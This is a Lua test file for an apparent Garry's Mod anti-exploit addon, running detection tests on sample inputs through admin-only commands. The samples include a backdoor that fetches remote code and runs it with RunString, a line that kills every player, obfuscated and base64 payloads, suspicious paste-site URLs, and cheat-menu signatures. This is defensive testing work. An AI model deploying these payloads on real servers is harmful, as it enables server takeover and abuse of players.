--[[
    Exploit Test Module
    Test various exploit scenarios
]]

-- Admin only test commands
local function IsTestAllowed(ply)
    return IsValid(ply) and ply:IsSuperAdmin()
end

-- Test 1: Simulate suspicious network message
concommand.Add("antiexploit_test_network", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Simulating suspicious network message...")
    
    -- Test various suspicious patterns
    local test_messages = {
        "LOKI_EXPLOIT_MENU",
        "citizen_hack",
        "4C4F4B49", -- "LOKI" in hex
        "bG9raV9tZW51", -- "loki_menu" in base64
        string.rep("A", 64), -- Long hex-like string
        "!!@@##$$%%", -- Special characters
        "BACKDOOR_NET",
        "_Infinity"
    }
    
    for _, msg in ipairs(test_messages) do
        print("[TEST] Testing message: " .. msg)
        
        -- Directly test our analyzer
        local threat = AntiExploit:AnalyzeNetworkMessage(msg, {
            source = "@",
            short_src = "unknown"
        })
        
        print(string.format("[TEST RESULT] Message: %s | Threat: %s | Confidence: %.2f%%", 
            msg, 
            threat.is_threat and "YES" or "NO", 
            threat.confidence * 100))
        
        if threat.indicators then
            print("[TEST] Indicators: " .. table.concat(threat.indicators, ", "))
        end
    end
    
    ply:ChatPrint("[AntiExploit] Network test completed - check console")
end)

-- Test 2: Simulate code execution attempt
concommand.Add("antiexploit_test_code", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Simulating code execution attempts...")
    
    local test_codes = {
        -- Backdoor attempt
        [[http.Fetch("http://malicious.com/backdoor.lua", function(c) RunString(c) end)]],
        
        -- Typical exploit code
        [[for k,v in pairs(player.GetAll()) do v:Kill() end]],
        
        -- Obfuscated code
        [[local _0x1337 = loadstring("\x52\x75\x6E\x53\x74\x72\x69\x6E\x67")]],
        
        -- Base64 encoded
        [[util.Base64Decode("cnVuU3RyaW5nKCJleHBsb2l0Iik=")]],
        
        -- Debug library abuse
        [[debug.getupvalue(net.Receive, 1)("exploit", function() end)]],
        
        -- Global table manipulation
        [[_G["RunString"] = function() print("hacked") end]]
    }
    
    for i, code in ipairs(test_codes) do
        print("\n[TEST] Test code #" .. i)
        
        local threat = AntiExploit:AnalyzeCodeExecution(code, {
            source = "@",
            short_src = "unknown"
        })
        
        print(string.format("[TEST RESULT] Threat: %s | Confidence: %.2f%%", 
            threat.is_threat and "DETECTED" or "CLEAN", 
            threat.confidence * 100))
        print("[TEST] Complexity: " .. threat.complexity)
        print("[TEST] Obfuscation: " .. threat.obfuscation)
    end
    
    ply:ChatPrint("[AntiExploit] Code execution test completed")
end)

-- Test 3: Simulate HTTP request to malicious domain
concommand.Add("antiexploit_test_http", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Simulating HTTP requests...")
    
    local test_urls = {
        "http://pastebin.com/raw/exploit",
        "https://hastebin.com/raw/backdoor",
        "http://suspicious-domain.ru/hack.lua",
        "https://steamcommunity.com/legitimate", -- Should be safe
        "data:text/plain;base64,cnVuU3RyaW5n",
        "http://localhost:8080/backdoor",
        "http://192.168.1.1/exploit"
    }
    
    for _, url in ipairs(test_urls) do
        print("\n[TEST] Testing URL: " .. url)
        
        local threat = AntiExploit:AnalyzeHTTPRequest(url, {
            source = "@",
            short_src = "unknown"
        })
        
        print(string.format("[TEST RESULT] URL: %s | Threat: %s | Confidence: %.2f%%", 
            url,
            threat.is_threat and "BLOCKED" or "ALLOWED", 
            threat.confidence * 100))
    end
    
    ply:ChatPrint("[AntiExploit] HTTP test completed")
end)

-- Test 4: Simulate player behavior anomalies
concommand.Add("antiexploit_test_behavior", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Simulating behavioral anomalies...")
    
    -- Create fake player data
    local fake_steamid = "TEST_" .. ply:SteamID64()
    
    AntiExploit.PlayerData[fake_steamid] = {
        join_time = CurTime() - 300,
        commands = {},
        movements = {},
        chat_messages = {},
        network_activity = {},
        spawn_events = {},
        behavioral_score = 0
    }
    
    -- Simulate rapid commands
    print("[TEST] Simulating rapid command spam...")
    for i = 1, 25 do
        table.insert(AntiExploit.PlayerData[fake_steamid].commands, {
            cmd = "test_command_" .. i,
            timestamp = CurTime() - (25 - i) * 0.1
        })
    end
    
    -- Simulate teleportation
    print("[TEST] Simulating teleportation...")
    local base_pos = ply:GetPos()
    for i = 1, 10 do
        table.insert(AntiExploit.PlayerData[fake_steamid].movements, {
            position = base_pos + Vector(i * 1000, 0, 0),
            velocity = Vector(0, 0, 0),
            timestamp = CurTime() - (10 - i) * 0.1
        })
    end
    
    -- Analyze behavior
    local analysis = AntiExploit:AnalyzeBehaviorPatterns(AntiExploit.PlayerData[fake_steamid])
    
    print("\n[TEST RESULT] Behavioral Analysis:")
    print("Threat Detected: " .. tostring(analysis.threat_detected))
    print("Confidence: " .. (analysis.confidence * 100) .. "%")
    print("Patterns: " .. table.concat(analysis.suspicious_patterns, ", "))
    
    -- Clean up
    AntiExploit.PlayerData[fake_steamid] = nil
    
    ply:ChatPrint("[AntiExploit] Behavior test completed")
end)

-- Test 5: Simulate known exploit menu patterns
concommand.Add("antiexploit_test_exploit_menu", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Simulating known exploit menu patterns...")
    
    -- Known exploit menu network messages
    local exploit_signatures = {
        -- Loki
        "loki_menu_open", "LOKI_NET", "loki::command",
        
        -- Citizen Hack
        "citizen_hack", "CH_NET_EXPLOIT", "citizenhack_cmd",
        
        -- Aimware
        "aw_net", "AIMWARE_MSG", "aw::exploit",
        
        -- Generic
        "exploit_menu", "hack_command", "cheat_net",
        "backdoor_exec", "bypass_anticheat", "admin_force"
    }
    
    local detected = 0
    
    for _, signature in ipairs(exploit_signatures) do
        local threat = AntiExploit:AnalyzeNetworkMessage(signature, {
            source = "@", 
            short_src = "exploit_test"
        })
        
        if threat.is_threat then
            detected = detected + 1
            print(string.format("[DETECTED] %s - Confidence: %.2f%%", 
                signature, threat.confidence * 100))
        else
            print(string.format("[MISSED] %s - Confidence: %.2f%%", 
                signature, threat.confidence * 100))
        end
    end
    
    print(string.format("\n[TEST SUMMARY] Detected %d/%d exploit signatures (%.1f%% detection rate)", 
        detected, #exploit_signatures, (detected / #exploit_signatures) * 100))
    
    ply:ChatPrint(string.format("[AntiExploit] Exploit menu test: %d/%d detected", 
        detected, #exploit_signatures))
end)

-- Test 6: Full system stress test
concommand.Add("antiexploit_test_stress", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n[TEST] Running full system stress test...")
    ply:ChatPrint("[AntiExploit] Starting stress test - this may cause lag!")
    
    local start_time = SysTime()
    local tests_run = 0
    
    -- Test AI predictions
    for i = 1, 100 do
        local features = {}
        for j = 1, 20 do
            features[j] = math.random()
        end
        
        local class, confidence = AntiExploit:AIPredict(features)
        tests_run = tests_run + 1
    end
    
    -- Test pattern matching
    for i = 1, 50 do
        local test_string = string.rep(string.char(math.random(65, 90)), math.random(10, 50))
        AntiExploit:AnalyzeNetworkMessage(test_string, {source = "@"})
        tests_run = tests_run + 1
    end
    
    -- Test code analysis
    for i = 1, 25 do
        local test_code = "function test" .. i .. "() print('test') end"
        AntiExploit:AnalyzeCodeExecution(test_code, {source = "@"})
        tests_run = tests_run + 1
    end
    
    local elapsed = SysTime() - start_time
    
    print(string.format("\n[TEST COMPLETE] Ran %d tests in %.3f seconds", tests_run, elapsed))
    print(string.format("[PERFORMANCE] %.1f tests/second", tests_run / elapsed))
    
    ply:ChatPrint(string.format("[AntiExploit] Stress test complete: %d tests in %.3fs", 
        tests_run, elapsed))
end)

-- Test 7: Check system status
concommand.Add("antiexploit_status", function(ply)
    if not IsTestAllowed(ply) then return end
    
    print("\n=== ANTIEXPLOIT SYSTEM STATUS ===")
    
    -- AI Brain status
    if AntiExploit.AIBrain then
        print("\n[AI Brain]")
        print("Neural Network: " .. (AntiExploit.AIBrain.neural_network and "ACTIVE" or "INACTIVE"))
        print("Training Samples: " .. (AntiExploit.AIBrain.neural_network.training_samples or 0))
        print("Accuracy: " .. ((AntiExploit.AIBrain.neural_network.accuracy or 0) * 100) .. "%")
        print("Learning Rate: " .. (AntiExploit.AIBrain.neural_network.learning_rate or 0))
    end
    
    -- Threat Database
    if AntiExploit.ThreatDatabase then
        print("\n[Threat Database]")
        print("Network Signatures: " .. #AntiExploit.ThreatDatabase.network_signatures)
        print("Workshop Threats: " .. #AntiExploit.ThreatDatabase.workshop_threats)
        print("Malicious Domains: " .. #AntiExploit.ThreatDatabase.malicious_domains)
    end
    
    -- Player monitoring
    print("\n[Player Monitoring]")
    print("Tracked Players: " .. table.Count(AntiExploit.PlayerData or {}))
    print("Player Assessments: " .. table.Count(AntiExploit.PlayerAssessments or {}))
    
    -- Performance
    print("\n[Performance]")
    print("Server FPS: " .. math.Round(1 / engine.TickInterval(), 1))
    print("Memory Usage: " .. math.Round(collectgarbage("count") / 1024, 1) .. " MB")
    
    -- Self-healing
    if AntiExploit.SelfHealing then
        print("\n[Self-Healing]")
        print("Detected Issues: " .. #AntiExploit.SelfHealing.detected_issues)
        print("Applied Fixes: " .. #AntiExploit.SelfHealing.applied_fixes)
    end
    
    -- Error logger
    if AntiExploit.ErrorLogger then
        print("\n[Error Logger]")
        print("Total Errors: " .. AntiExploit.ErrorLogger.error_count)
        print("Unique Patterns: " .. table.Count(AntiExploit.ErrorLogger.patterns))
    end
    
    print("\n================================")
    
    ply:ChatPrint("[AntiExploit] Status report printed to console")
end)

print("[AntiExploit Test Module] Loaded - Admin commands available:")
print("  antiexploit_test_network - Test network message detection")
print("  antiexploit_test_code - Test code execution detection")
print("  antiexploit_test_http - Test HTTP request filtering")
print("  antiexploit_test_behavior - Test behavioral analysis")
print("  antiexploit_test_exploit_menu - Test known exploit signatures")
print("  antiexploit_test_stress - Run stress test")
print("  antiexploit_status - Show system status")